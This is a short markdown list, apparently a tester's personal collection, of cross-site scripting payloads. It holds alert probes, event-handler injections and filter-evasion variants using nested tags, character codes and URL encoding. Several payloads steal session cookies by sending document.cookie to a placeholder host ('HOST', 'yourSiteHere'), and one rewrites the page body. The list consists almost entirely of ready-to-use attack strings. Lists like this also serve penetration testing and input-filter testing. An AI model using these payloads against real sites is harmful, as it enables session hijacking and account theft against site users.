## This will be a collection of XSS JavaScript Payloads I have used



"><h1>test</h1>
'+alert(1)+'
"onmouserover="alert(1)
http://"onmouseover="alert(1)
<body onload=alert(1)>



<img src=x onerror=alert(1) />
<img src=x onerror='alert(1)' />



<object data=javascript:alert(1)>
<x onmouseover=alert(1)>


<a onmouseover='alert(1)'>


<svg onload=alert(1)>

<svg onload=fetch('//HOST/?cookie='+document.cookie)>

<svg onload="document.body.innerHTML='<img src=//HOST/IMAGE>'">



“><script>alert(1)</script>
<script>alert(document.domain)</script>
<sc<script>ript>alert(1)</sc</script>ript>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

<script>eval("al"+"ert(1)")</script>
<script>eval("al"%2b"ert(1)")</script>
</script>;<script>alert(1)</script>
</script><script>alert(1)</script>


%3Cscript%3Edocument.write(%27%3Cimg%20src=%22http://yourSiteHere?c=%27%2bdocument.cookie%2b%27%22%20/%3E%27);%3C/script%3E
The above code looks like the below code before encoding
<script>document.write('<img src="yourSiteHere?c='%2bdocument.cookie%2b'" />');</script>
